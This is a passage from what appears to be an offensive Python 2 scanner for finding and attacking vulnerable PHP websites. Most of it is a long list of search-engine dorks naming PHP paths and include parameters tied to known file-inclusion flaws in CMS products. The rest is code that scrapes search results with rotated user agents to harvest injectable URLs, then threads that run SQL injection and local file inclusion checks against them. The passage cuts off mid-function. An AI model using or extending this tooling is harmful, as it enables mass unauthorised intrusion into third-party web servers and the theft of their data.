'/classes/adodbt/sql.php?classes_dir= adobt', '/classified_right.php?language_dir= "classified.php"', '/classified_right.php?language_dir= classified.php', '/classified_right.php?language_dir= classified.php phpbazar', '/classified_right.php?language_dir= "phpbazar"']
d0rk += [ '/classified_right.php?language_dir= phpbazar', '/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "phpCOIN"', '/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= phpCOIN', '/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "phpCOIN 1.2.3"', '/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= phpCOIN 1.2.3', '/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "powered by phpCOIN 1.2.3"', '/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= powered by phpCOIN 1.2.3', '/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= com_extended_registration', '/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= "com_extended_registration"', '/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= com_extended_registration', '/components/com_facileforms/facileforms.frame.php?ff_compath= com_facileforms"', '/components/com_facileforms/facileforms.frame.php?ff_compath= "com_facileforms"', '/components/com_facileforms/facileforms.frame.php?ff_compath= com_facileforms', 'components/com_performs/performs.php?mosConfig_absolute_path= com_performs', 'components/com_performs/performs.php?mosConfig_absolute_path= "com_performs"', '/components/com_zoom/includes/database.php?mosConfig_absolute_path= "com_zoom"', '/components/com_zoom/includes/database.php?mosConfig_absolute_path= com_zoom', '/components/com_zoom/includes/database.php?mosConfig_absolute_path= "index.php?option="com_zoom"', 'content.php?page= "content.php?page=*.php"', '/embed/day.php?path= "Calendar"', '/embed/day.php?path= Calendar', '/embed/day.php?path= intitle:"Login to Calendar"', '/embed/day.php?path= "Login to Calendar"', '/embed/day.php?path= Login to Calendar', '/embed/day.php?path= "WebCalendar"', '/embed/day.php?path= WebCalendar', 'enc/content.php?Home_Path= "doodle"', 'enc/content.php?Home_Path= doodle', 'enc/content.php?Home_Path= "doodle cart"', 'enc/content.php?Home_Path= doodle cart', 'enc/content.php?Home_Path= "powered by doodle cart"', 'enc/content.php?Home_Path= powered by doodle cart', '/header.php?abspath= "MobilePublisherPHP"', '/header.php?abspath= MobilePublisherPHP', 'impex/ImpExData.php?systempath= intext:powered by vbulletin', 'impex/ImpExData.php?systempath= powered by vbulletin', 'impex/ImpExData.php?systempath= "vbulletin"', 'impex/ImpExData.php?systempath= vbulletin', '/includes/dbal.php?eqdkp_root_path= "EQdkp"', '/includes/dbal.php?eqdkp_root_path= EQdkp', '/includes/dbal.php?eqdkp_root_path= "powered by EQdkp"', '/includes/dbal.php?eqdkp_root_path= powered by EQdkp', '/includes/kb_constants.php?module_root_path= "Base"', '/includes/kb_constants.php?module_root_path= Base', '/includes/kb_constants.php?module_root_path= "Knowledge"', '/includes/kb_constants.php?module_root_path= Knowledge', '/includes/kb_constants.php?module_root_path= "Knowledge Base"']
d0rk += [ '/includes/kb_constants.php?module_root_path= Knowledge Base', '/includes/kb_constants.php?module_root_path= "Powered by Knowledge Base"', '/includes/kb_constants.php?module_root_path= Powered by Knowledge Base', 'index1.php?= "index1.php?="', 'index1.php?= index1.php?=', 'index1.php?= "index1.php?=*.php?', 'index2.php?= "index2.php?="', 'index2.php?= index2.php?=', 'index2.php?= "index2.php?=*.php?"', 'index.php?body= index.php?body=', 'index.php?body= "index.php?body="', 'index.php?go1= index.php?go1=', 'index.php?go1= "index.php?go1="', 'index.php?go= "index.php?go="', 'index.php?go= index.php?go=', 'index.php?pageurl= "index.php?pageurl="', 'index.php?pageurl= "index.php?pageurl=*.php"', 'index.php?pageurl= index.php?pageurl=*.php', 'index.php?pageurl= "index.php?pageurl=*.php', 'index.php?pagina1= "index.php?pagina1="', 'index.php?pagina1= index.php?pagina1=', 'index.php?pagina= "index.php?pagina="', 'index.php?pagina= "index.php?pagina=*.php"', 'index.php?site1= index.php?site1=', 'index.php?site1= "index.php?site1="', 'index.php?site= "index.php?site="', 'index.php?site= index.php?site=', 'index.php?var1= "index.php?var1="', 'index.php?var1= index.php?var1=', 'index.php?var2= index.php?var2=', 'index.php?var= index.php?va21=', 'index.php?var= index.php?var=', 'index.php?var= "index.php?var1="', 'index.php?var= index.php?var1=', 'index.php?var= "index.php?var2="', 'index.php?var= index.php?var2=', 'index.php?var= "index.php?var=*.php"', 'index.php?var= index.php?var=*.php', '/login.php?dir= login.php?dir=', '/login.php?dir= "login.php?dir="', '/login.php?dir= login.php?dir=', 'main.php?id= "main.php?id=*.php"', '/main.php?sayfa= "main.php?sayfa="', '/main.php?sayfa= main.php?sayfa=', '/mcf.php?content= mcf.php"', 'mcf.php?content= mcf.php"', 'mcf.php?content= "mcf.php"', 'mcf.php?content= mcf.php', '/modules/TotalCalendar/about.php?inc_dir= /TotalCalendar', '/modules/TotalCalendar/about.php?inc_dir= /TotalCalendar', '/modules/TotalCalendar/about.php?inc_dir= "TotalCalendar"', '/modules/TotalCalendar/about.php?inc_dir= TotalCalendar', '/modules/vwar/admin/admin.php?vwar_root= "vwar"', '/modules/vwar/admin/admin.php?vwar_root= vwar', 'phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= "index.php?id="', 'phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= index.php?id=', 'phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= "phpwcms/index.php?id="', 'phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= phpwcms/index.php?id=', 'skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer"', 'skins/advanced/advanced1.php?pluginpath[0]= Sabdrimer', 'skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"', 'skins/advanced/advanced1.php?pluginpath[0]= Sabdrimer CMS', 'skins/advanced/advanced1.php?pluginpath[0]= skins/advanced/advanced1.php?pluginpath[0]= "CMS"', 'skins/advanced/advanced1.php?pluginpath[0]= skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"']
d0rk += [ '/skin/zero_vote/error.php?dir= "skin/zero_vote/error.php"', '/skin/zero_vote/error.php?dir= skin/zero_vote/error.php', '/sources/functions.php?CONFIG[main_path]= "(Powered By ScozNews)"', '/sources/functions.php?CONFIG[main_path]= "Powered By ScozNews"', '/sources/functions.php?CONFIG[main_path]= (Powered By ScozNews)', '/sources/functions.php?CONFIG[main_path]= Powered By ScozNews', '/sources/functions.php?CONFIG[main_path]= "ScozNews"', '/sources/functions.php?CONFIG[main_path]= ScozNews', '/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Aardvark"', '/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Aardvark', '/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Aardvark TopSites"', '/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Aardvark TopSites', '/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Powered By Aardvark Topsites PHP 4.2.2"', '/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Powered By Aardvark Topsites PHP 4.2.2', '/sources/template.php?CONFIG[main_path]= "(Powered By ScozNews)"', '/sources/template.php?CONFIG[main_path]= (Powered By ScozNews)', '/sources/template.php?CONFIG[main_path]= Powered By ScozNews', '/sources/template.php?CONFIG[main_path]= "ScozNews"', '/sources/template.php?CONFIG[main_path]= ScozNews', '/surveys/survey.inc.php?path= surveys', '/surveys/survey.inc.php?path= "surveys"', '/tags.php?BBCodeFile= intitle:"Tagger LE"', '/tags.php?BBCodeFile= intitle:"Tagger LE" tags.php', '/tags.php?BBCodeFile= "Tagger LE"', '/tags.php?BBCodeFile= Tagger LE', '/tags.php?BBCodeFile= "tags.php"', '/tags.php?BBCodeFile= tags.php', '/templates/headline_temp.php?nst_inc= intitle:fusion:news:management', '/templates/headline_temp.php?nst_inc= \'fusion"', '/templates/headline_temp.php?nst_inc= "fusion"', '/templates/headline_temp.php?nst_inc= fusion', '/templates/headline_temp.php?nst_inc= fusion:news:management:system', '/templates/headline_temp.php?nst_inc= "management"', '/templates/headline_temp.php?nst_inc= management', '/templates/headline_temp.php?nst_inc= "news"', '/templates/headline_temp.php?nst_inc= news', '/templates/headline_temp.php?nst_inc= "system"', '/templates/headline_temp.php?nst_inc= system', '/tools/send_reminders.php?includedir= "day.php?date="', '/tools/send_reminders.php?includedir= day.php?date=', '/ws/get_events.php?includedir= /WebCalendar/', '/ws/get_events.php?includedir= "/WebCalendar/"', '/ws/get_events.php?includedir= "WebCalendar"', '/zipndownload.php?PP_PATH= "PhotoPost"', '/zipndownload.php?PP_PATH= PhotoPost', '/zipndownload.php?PP_PATH= "PhotoPostP"', '/zipndownload.php?PP_PATH= "PhotoPost PHP"', '/zipndownload.php?PP_PATH= "PhotoPost PHP 4.6"', '/zipndownload.php?PP_PATH= PhotoPost PHP 4.6', '/zipndownload.php?PP_PATH= "Powered by: PhotoPost PHP 4.6"', '/zipndownload.php?PP_PATH= Powered by: PhotoPost PHP 4.6', 'cmd.php?arg= .php?arg=']
d0rk += [ '/codebb/lang_select?phpbb_root_path= codebb', '/codebb/lang_select?phpbb_root_path= codebb 1.1b3', 'components/com_rsgery/rsgery.html.php?mosConfig_absolute_path= rs gery', 'components/com_rsgery/rsgery.html.php?mosConfig_absolute_path= rsgery', 'components/com_rsgery/rsgery.html.php?mosConfig_absolute_path= rsgery.php', 'content.php?inc= .php?inc="', 'content.php?seite= content.php?seite=', 'content.php?seite= .php?seite=', 'dbase.php?action= dbase.php', 'dbase.php?action= dbase.php?action=', 'dbase.php?action= .php?action=', 'default.php?arquivo= .php?arquivo=', 'default.php?vis= .php?vis="', 'define.php?term= .php?term="', 'detail.php?prod= detail.php?prod="', 'detail.php?prod= .php?prod="', 'details.php?loc= details.php?loc=', 'details.php?loc= .php?loc=', 'directions.php?loc= directions.php?loc=', 'direct.php?loc= direct.php?loc=', 'display.php?f= display.php?f=', 'display.php?file= display.php?file=', 'display.php?lang= display.php?lang=', 'display.php?l= display.php?l=', 'display.php?ln= display.php?ln=', 'display.php?pag= display.php?pag=', 'display.php?page= display.php?page="', 'display.php?page= .php?page="', 'display.php?page=&lang= display.php?page="', 'display.php?page=&lang= .php?page="', 'display.php?p= display.php?p=', 'display.php?pg= display.php?pg=', 'display.php?s= display.php?s=', 'display.php?table= display.php?table=', 'display.php?table= .php?table=', 'download.php?sub= "download.php?sub="', 'download.php?sub= download.php?sub=', 'eng.php?img= eng.php?img=', 'eng.php?img= .php?img=', '/exibir.php?arquivo= .php?arquivo=', 'experts.php?sub= "experts.php?sub="', 'experts.php?sub= experts.php?sub=', 'forum.php?seite= .php?seite=', 'frag.php?exec= frag.php"', 'frag.php?exec= frag.php?exec="', 'frag.php?exec= .php?exec="', 'frame.php?loc= .php?loc="', 'galerie.php?do= .php?do="', 'glossary.php?term= .php?term="', 'handlinger.php?vis= .php?vis="', '/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHP Ged View', '/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHP GedView', '/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHPGedView', '/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHPGedView <= 3.3.7', 'home1.php?ln= .php?ln=', 'home2.php?ln= .php?ln=', 'home.php?a= home.php?a="', 'home.php?a= .php?a="', 'home.php?act= "home.php?act="', 'home.php?act= home.php?act=', 'home.php?arg= .php?arg=', 'home.php?func= .php?func="', 'home.php?i= "home.php?i="', 'home.php?i= home.php?i=', 'home.php?inc= "home.php?inc="', 'home.php?inc= home.php?inc=', 'home.php?ln= .php?ln=', 'home.php?ltr= .php?ltr="', 'home.php?sit= .php?sit="', 'home.php?table= .php?table=', 'image.php?img= image.php?img=', 'image.php?img= .php?img=', 'img.php?loc= img.php?loc="', 'img.php?loc= .php?loc="', 'inc.php?inc= .php?inc="', 'index1.php?arg= .php?arg=', 'index1.php?arq= .php?arq=', 'index1.php?func= .php?func="', 'index1.php?inc= .php?inc="', 'index1.php?lk= .php?lk="', '/index1.php?ln= .php?ln=', 'index1.php?ltr= .php?ltr="']
d0rk += [ 'index1.php?mid= index1.php?mid=', 'index1.php?page= index1.php?page="', 'index1.php?p= .php?p="', 'index1.php?p= .php?pag="', 'index1.php?p= .php?page="', 'index1.php?p= .php?pg="', 'index1.php?s= index1.php?s="', 'index1.php?show= index1.php?show="', 'index1.php?show= .php?show="', 'index1.php?table= .php?table=', 'index2.php?arg= .php?arg=', 'index2.php?arq= .php?arq=', 'index2.php?c= index2.php?c="', 'index2.php?c= .php?c="', 'index2.php?cont= index2.php?cont="', 'index2.php?cont= .php?cont="', 'index2.php?content= index2.php?cont="', 'index2.php?content= index2.php?content="', 'index2.php?content= .php?content="', 'index2.php?content= index2.php?content=', 'index2.php?content= .php?content=', 'index2.php?i= /index2.php?i=', 'index2.php?inc= .php?inc="', 'index2.php?l= .php?l="', 'index2.php?lg= index.php?lg="', 'index2.php?lk= .php?lk="', 'index2.php?ln= index.php?ln="', 'index2.php?ln= .php?ln="', 'index2.php?lng= index.php?lng="', 'index2.php?loca= index2.php?loca=', 'index2.php?loca= .php?loca=', 'index2.php?meio= .php?meio=', 'index2.php?s= index2.php?s="', 'index2.php?s= .php?s="', 'index2.php?table= .php?table=', 'index2.php?x= index2.php?x=', 'index2.php?x= .php?x=', 'index.php3?act= index.php3?act=', 'index.php3?act= .php3?act=', 'index.php3?act= .php3?act="', 'index.php3?file= .php3?f="', 'index.php3?file= .php3?file="', 'index.php3?id= index.php3?id=', 'index.php3?i= index.php3?i=', 'index.php3?lang= index.php3?lang=', 'index.php3?l= index.php3?l=', 'index.php3?page= index.php3?page=', 'index.php3?pag= index.php3?pag=', 'index.php3?p= index.php3?p="', 'index.php3?p= index.php3?pag="', 'index.php3?p= index.php3?page="', 'index.php3?p= index.php3?pg="', 'index.php3?pg= index.php3?pg=', 'index.php3?p= index.php3?p=', 'index.php3?s= index.php3?s="', 'index.php3?s= index.php3?s=', 'index.php3?s= .php3?s=', 'index.php3?s= .php3?s="', 'index.php4?lang= index.php4?lang="', 'index.php4?lang= index.php4?lang="', 'index.php4?lang= .php4?lang=', 'index.php4?lang= .php4?lang="', 'index.php4?lang= .php4?lang=', 'index.php5?lang= index.php5?lang="', 'index.php5?lang= index.php5?lang=', 'index.php5?lang= .php5?lang="', 'index.php?a= index.php?a="', 'index.php?a= .php?a="', 'index.php?acao= index.php?acao=', 'index.php?acao= .php?acao=', 'index.php?act= "index.php?act="', 'index.php?act= index.php?act=', 'index.php?action= index.php?action="', 'index.php?action= .php?action="', 'index.php?arg= index.php?arg=', 'index.php?arg= .php?arg=', 'index.php?arq= index.php?arq=', 'index.php?arq= .php?arq=', 'index.php?arquivo= .php?arquivo=', 'index.php?ba= index.php?ba="', 'index.php?b= index.php?b="', 'index.php?bas= index.php?bas="', 'index.php?bas= .php?bas="', 'index.php?cal= index.php?cal=', 'index.php?cal= "index.php?cal="', 'index.php?cal= ".php?cal="', 'index.php?c= index.php?c="', 'index.php?cal= .php?cal=', 'index.php?c= index.php?c=', 'index.php?c= "index.php?c="', 'index.php?c= ".php?c="']
d0rk += [ '/index.php?cms= /index.php?cms=', '/index.php?cms= /index.php?cms="', 'index.php?command= index.php?command="', 'index.php?command= .php?command="', 'index.php?content= index.php?content=', 'index.php?content= .php?content=', 'index.php?c= .php?c=', 'index.php?d1= .php?d1="', 'index.php?def= index.php?def="', 'index.php?def= .php?def="', 'index.php?def= index.php?def=', '/index.php?dn= /index.php?dn=', '/index.php?dn= index.php?dn="', '/index.php?dn= .php?dn=', '/index.php?dn= .php?dn="', 'index.php?dok= index.php?dok="', 'index.php?dok= .php?dok="', 'index.php?e= index.php?e="', 'index.php?exec= index.php?exec=', 'index.php?exec= .php?exec=', 'index.php?f1= .php?f1="', 'index.php?f= index.php?f="', 'index.php?fase= index.php?fase="', 'index.php?fase= .php?fase="', 'index.php?file= index.php?file="', 'index.php?fn= index.php?fn="', 'index.php?fn= .php?fn="', 'index.php?fPage= index.php?fPage="', 'index.php?fPage= index.php?fPage=', 'index.php?fPage= .php?fPage=', 'index.php?fPage= .php?fPage="', 'index.php?fPage= index.php?fPage=', 'index.php?fset= .php?fset="', 'index.php?func= .php?func="', 'index.php?goto= index.php?goto="', 'index.php?goto= .php?goto="', 'index.php?id=1&lang= index.php?i=', 'index.php?id=1&lang= "index.php?id="', 'index.php?id=1&lang= index.php?id=', 'index.php?id=1&lang= ".php?id="', 'index.php?id= index.php?id="', '/index.php?id=&lang= index.php?id="', '/index.php?id=&lang= .php?id="', 'index.php?id=&lang= "index.php?id="', 'index.php?id=&lang= ".php?id="', '/index.php?id=&page= index.php?id="', '/index.php?id=&page= .php?id="', 'index.php?inc= .php?inc="', 'index.php?ir= ".php?ir="', '/index.php?lang=en&cat= index.php?lang="', '/index.php?lang=en&cat= .php?lang="', '/index.php?lang=en&page= index.php?lang="', '/index.php?lang=en&page= .php?lang="', '/index.php?lang=en&page= index.php?lang=', 'index.php?lang=en&page= index.php?lang=', '/index.php?lang=en&page= .php?lang=', 'index.php?lang=en&page= .php?lang=', 'index.php?lang= "index.php?lang="', 'index.php?lang= index.php?lang=', 'index.php?lang=&page= index.php?lang=', 'index.php?lang=&page= .php?lang=', 'index.php?lg= "index.php?lg="', 'index.php?lg= index.php?lg=', 'index.php?lk= .php?lk="', '/index.php?ln= .php?ln=', 'index.php?lng= "index.php?lng="', 'index.php?lng= index.php?lng=', 'index.php?ln= "index.php?ln="', 'index.php?ln= index.php?ln=', 'index.php?ln= ".php?ln="', 'index.php?lnk= index.php?lnk=', 'index.php?lnk= .php?lnk=', 'index.php?lnk= "index.php?lnk="', 'index.php?lnk= ".php?lnk="', 'index.php?ln= .php?ln=', 'index.php?loca= index.php?loca=', '/index.php?loc= .php?loc="', 'index.php?loca= .php?loca=', '/index.php?loc=&cat= index.php?loc="', '/index.php?loc=&cat= .php?loc="', '/index.php?loc=&lang= index.php?loc="', '/index.php?loc=&lang= .php?loc="', '/index.php?loc=&page= index.php?loc="', '/index.php?loc= .php?loc=', '/index.php?loc=start&page= index.php?loc="', 'index.php?ltr= index.php?ltr="']
d0rk += [ 'index.php?ltr= .php?ltr="', 'index.php?main= .php?main="', 'index.php?m= index.php?m="', 'index.php?meio= index.php?meio="', 'index.php?meio= index.php?meio=', 'index.php?meio= .php?meio=', 'index.php?meio= .php?meio="', 'index.php?mf= index.php?mf=', 'index.php?mf= .php?mf=', 'index.php?mf= .php?mf="', 'index.php?mid= index.php?mid="', 'index.php?mid= index.php?mid=', 'index.php?mid= .php?mid=', 'index.php?mid= .php?mid="', 'index.php?middle= index.php?middle="', 'index.php?middle= index.php?middle=', 'index.php?middle= .php?middle="', 'index.php?mn= index.php?mn="', 'index.php?mn= .php?mn="', 'index.php?mod= index.php?mod="', 'index.php?mod= .php?mod="', 'index.php?new= index.php?new="', 'index.php?news= index.php?news="', 'index.php?page1= index.php?page1="', 'index.php?page1= .php?page1="', 'index.php?page= php5?page=', 'index.php?page= index.php?page=', 'index.php?page=&lang= index.php?p=', 'index.php?page=&lang= index.php?pag=', 'index.php?page=&lang= index.php?page=', 'index.php?page=&lang= index.php?pg=', 'index.php?page=&lang= .php?p=', 'index.php?page=&lang= .php?pag=', 'index.php?page=&lang= .php?page=', 'index.php?page=&lang= .php?pg=', 'index.php?pageN= .php?pageN="', 'index.php?pager= index.php?pager=', 'index.php?pager= .php?pager=', 'index.php?pagina= index.php?pagina=', 'index.php?pag= "index.php?pag="', 'index.php?pag= index.php?pag=', 'index.php?p= index.php?p="', 'index.php?pg= "index.php?pg="', 'index.php?pg= index.php?pg=', 'index.php?prod= .php?prod="', 'index.php?prod= .php?product="', 'index.php?product= .php?prod="', 'index.php?product= .php?product="', 'index.php?r= index.php?r="', 'index.php?s= index.php?s="', 'index.php?s= index.php?s=', 'index.php?s= .php?s=', 'index.php?s= .php?s="', 'index.php?secao= index.php?secao=', 'index.php?secao= .php?secao=', 'index.php?secao= "index.php?secao="', 'index.php?secao= ".php?secao="', '/index.php?seccion= /index.php?seccion=', '/index.php?seccion= .php?seccion=', 'index.php?sec= "index.php?sec="', 'index.php?sec= index.php?sec=', '/index.php?seite= /index.php?seite=', '/index.php?seite= .php?seite=', 'index.php?select= .php?select="', 'index.php?select= index.php?select=', 'index.php?select= .php?select=', 'index.php?set= index.php?set="', 'index.php?set= index.php?set=', 'index.php?set= .php?set=', 'index.php?set= .php?set="', 'index.php?sf= index.php?sf="', 'index.php?show= .php?show="', 'index.php?s= "index.php?s="', 'index.php?s= index.php?s=', 'index.php?sit= index.php?sit="', 'index.php?sit= .php?sit="', '/index.php?slang= /index.php?slang=', '/index.php?slang= "index.php?slang="', '/index.php?slang= .php?slang=', '/index.php?slang= ".php?slang="', 'index.php?sort= .php?sort="', 'index.php?spage= index.php?spage="', 'index.php?spage= index.php?spage=', 'index.php?spage= .php?spage=', 'index.php?spage= .php?spage="', 'index.php?ss= index.php?ss="', 'index.php?ss= .php?ss="', 'index.php?st= index.php?st="', 'index.php?sub= index.php?sub="']
d0rk += [ 'index.php?sub= index.php?sub=', 'index.php?sub= .php?sub=', 'index.php?sub= "index.php?sub="', 'index.php?sub= index.php?sub=', 'index.php?sub= "index.php?sub=""', 'index.php?sub= "index.php?sub="', 'index.php?sub= ".php?sub="', 'index.php?subpage= index.php?subpage="', 'index.php?subpage= .php?subpage="', 'index.php?subp= index.php?subp="', 'index.php?subp= .php?subp="', 'index.php?table= index.php?table=', 'index.php?table= .php?table=', 'index.php?t= index.php?t="', 'index.php?task= index.php?task=', 'index.php?task= .php?task=', 'index.php?term= .php?term="', 'index.php?textfield= .php?textfield="', 'index.php?theme= index.php?theme=', 'index.php?theme= .php?theme=', 'index.php?theme= .php?theme=', 'index.php?trans= index.php?trans="', 'index.php?trans= .php?trans="', 'index.php?v= index.php?v="', 'index.php?ver= index.php?ver="', 'index.php?ver= index.php?ver=', 'index.php?ver= .php?ver=', 'index.php?ver= .php?ver="', 'index.php?ver= .php?ver=', '/index.php?vis= /index.php?vis=', '/index.php?vis= .php?vis=', 'index.php?way= index.php?way=', 'index.php?way= .php?way=', 'index.php?wpage= index.php?wpage="', 'index.php?wpage= .php?wpage="', 'info.php?ln= info.php?ln="', 'info.php?ln= info.php?ln=', 'info.php?ln= .php?ln="', '/interna.php?meio= .php?meio="', 'kalender.php?vis= kalender.php"', 'kalender.php?vis= kalender.php?vis="', 'kalender.php?vis= .php?vis="', 'lang.php?arg= .php?arg=', 'lang.php?arq= .php?arq=', 'lang.php?lk= .php?lk="', 'lang.php?ln= .php?ln=', 'lang.php?subpage= .php?subpage="', 'lang.php?subp= .php?sub="', 'lang.php?subp= .php?subp="', '/lib/db/ez_sql.php?lib_path= ttCMS', '/lib/db/ez_sql.php?lib_path= ttCMS <= v4', '/lib/static/header.php?set_menu= iPhoto Album', '/lib/static/header.php?set_menu= iPhotoAlbum', '/lib/static/header.php?set_menu= iPhotoAlbum v1.1', 'link.php?do= .php?do="', 'list.php?product= .php?product=', 'list.php?table= .php?table=', 'ln.php?ln= .php?ln=', 'loc.php?l= .php?l="', 'loc.php?l= .php?loc="', 'loc.php?lang= .php?lang="', 'loc.php?lang= .php?loc="', 'loc.php?loc= loc.php?loc="', 'loc.php?loc= .php?loc="', 'login.php?loca= .php?loca=', 'magazine.php?inc= .php?inc="', 'main1.php?arg= .php?arg=', 'main1.php?ln= .php?ln=', 'main2.php?ln= .php?ln=', 'main.html.php?seite= .php?seite=', 'main.php3?act= main.php3?act="', 'main.php3?act= .php3?act="', 'main.php5?page= .php5?id=', 'main.php?a= .php?a="', 'main.php?arg= .php?arg=', 'main.php?ba= main.php?ba="', 'main.php?ba= .php?ba="', 'main.php?command= main.php?command="', 'main.php?command= .php?command="', 'main.php?d1= main.php?d1="', 'main.php?d1= .php?d1="', 'main.php?f1= .php?f1="', 'main.php?fset= .php?fset="', 'main.php?inc= .php?inc="', 'main.php?ln= .php?ln=', 'main.php?ltr= .php?ltr="', 'main.php?s= main.php?s="', 'main.php?s= main.php?s=', 'main.php?s= .php?s=', 'main.php?s= .php?s="', 'main.php?sit= .php?sit="', 'main.php?table= .php?table=', 'main.php?vis= main.php?vis="', 'main.php?vis= main.php?vis=']
d0rk += [ 'main.php?vis= .php?vis="', 'mai.php?act= mai.php?act="', 'mai.php?act= mai.php?act=', 'mai.php?loc= mai.php?loc="', 'mai.php?loc= mai.php?loc=', 'mai.php?src= mai.php?src="', 'mai.php?src= mai.php?src=', 'map.php?loc= map.php?loc=', 'middle.php?file= "middle.php?file="', 'middle.php?file= "middle.php?page="', 'middle.php?file= ".php?file="', 'middle.php?file= ".php?page="', 'middle.php?file= middle.php?file=', 'middle.php?file= middle.php?page=', 'middle.php?file= .php?file=', 'middle.php?file= .php?page=', 'middle.php?page= "middle.php?page="', 'middle.php?page= ".php?page="', 'middle.php?page= middle.php?page=', 'middle.php?page= .php?page=', 'misc.php?do= .php?do="', 'mod.php?mod= mod.php?mod="', 'mod.php?mod= .php?mod="', 'module.php?mod= module.php?mod="', 'module.php?mod= .php?mod="', '/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook"', '/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= "PostGuestbook"', '/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= "PostGuestbook 0.6.1"', '/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook', '/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook 0.6.1', 'modul.php?mod= modul.php?mod="', 'modul.php?mod= .php?mod="', 'more.php?sub= "more.php?sub="', 'more.php?sub= more.php?sub=', 'nav.php?g= "nav.php?g="', 'nav.php?g= nav.php?g=', 'nav.php?go= "nav.php?go="', 'nav.php?go= nav.php?go=', 'nav.php?lk= .php?lk="', 'nav.php?ln= .php?ln=', 'nav.php?loc= nav.php', 'nav.php?loc= nav.php?loc=', 'nav.php?loc= .php?loc=', 'nav.php?nav= "nav.php?nav="', 'nav.php?nav= nav.php?nav=', 'nav.php?page= "nav.php?page="', 'nav.php?page= nav.php?page=', 'nav.php?pagina= "nav.php?pagina="', 'nav.php?pagina= nav.php?pagina=', 'nav.php?pag= "nav.php?pag="', 'nav.php?pag= nav.php?pag=', 'nav.php?pg= "nav.php?pg="', 'nav.php?pg= nav.php?pg=', 'nav.php?p= "nav.php?p="', 'nav.php?p= nav.php?p=', 'order.php?lang= order.php?lang=', 'order.php?list= order.php?list=', 'order.php?ln= order.php?ln=', 'order.php?l= order.php?l=', 'order.php?page= order.php?page=', 'order.php?pag= order.php?pag=', 'order.php?pg= order.php?pg=', 'order.php?p= order.php?p=', 'order.php?wp= order.php?wp=', 'order.php?wp= .php?wp=', '/?page= .php5?id=', 'page.php5?id= page.php5?id=', 'page.php5?id= .php5?id=', 'page.php?arq= .php?arq=', 'page.php?ln= .php?ln=', 'page.php?p= page.php?p="', 'page.php?p= page.php?p=', 'page.php?p= .php?p=', 'page.php?p= .php?p="', 'page.php?s= page.php?s="', 'page.php?s= page' ]




def search(maxc):
  urls = []
  urls_len_last = 0
  for site in sitearray:
    dark = 0
    for dork in go:
      dark += 1
      page = 0
      try:
        while page < int(maxc):
	  try:
            jar = cookielib.FileCookieJar("cookies")
            query = dork+"+site:"+site
            results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
            request_web =urllib2.Request(results_web)
            agent = random.choice(header)
            request_web.add_header('User-Agent', agent)
            opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            text = opener_web.open(request_web).read()
            stringreg = re.compile('(?<=href=")(.*?)(?=")')
            names = stringreg.findall(text)
            page += 1
            for name in names:
              if name not in urls:
	        if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
	          pass
	        elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name) or re.search("facebook", name) or re.search("twitter", name):
	          pass
                elif re.search(site,name):
	          urls.append(name)
            darklen = len(go)
            percent = int((1.0*dark/int(darklen))*100)
	    urls_len = len(urls)
	    sys.stdout.write("\rSite: %s | Collected urls: %s | D0rks: %s/%s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),dark,darklen,repr(percent),repr(page)))
	    sys.stdout.flush()
            if urls_len == urls_len_last:
              page = int(maxc)
            urls_len_last = len(urls)

          except:
            pass
      except(KeyboardInterrupt):
        pass
    tmplist = []
    print "\n\n[+] URLS (unsorted): ",len(urls)
    for url in urls:
      try:
        host = url.split("/",3)
        domain = host[2]
        if domain not in tmplist and "=" in url:
	  finallist.append(url)
	  tmplist.append(domain)
	
      except:
        pass
    print "[+] URLS (sorted)  : ",len(finallist)
    return finallist

  
class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
class lfiThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicLFI(url)
                                else:
